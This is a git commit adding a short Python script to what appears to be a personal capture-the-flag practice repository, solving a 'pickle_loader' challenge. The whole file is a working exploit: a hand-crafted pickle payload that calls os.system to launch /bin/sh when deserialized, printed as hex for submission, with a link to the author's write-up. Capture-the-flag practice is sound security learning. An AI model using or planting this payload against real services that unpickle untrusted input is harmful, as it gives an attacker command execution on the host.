b3a679dbc177e003d919d4d13b2819a650ede464
Gitudon <oniku.udon.029@gmail.com>
2026-02-23 10:28:05 +0900

    Daily_AlpacaHack: 2/19

---
+++ Daily_AlpacaHack/Medium/pickle_loader.py
@@ -0,0 +1,5 @@
+# https://www.notion.so/kakur41-wrteup/Daily-AlpacaHack-2-15-2-21-30ada8520c02807bb3e0ca81675c9b93#30ada8520c0280ceb51bd2b038792639
+
+code = b"cos\nsystem\n(V/bin/sh\ntR."
+payload = code.hex()
+print(payload)
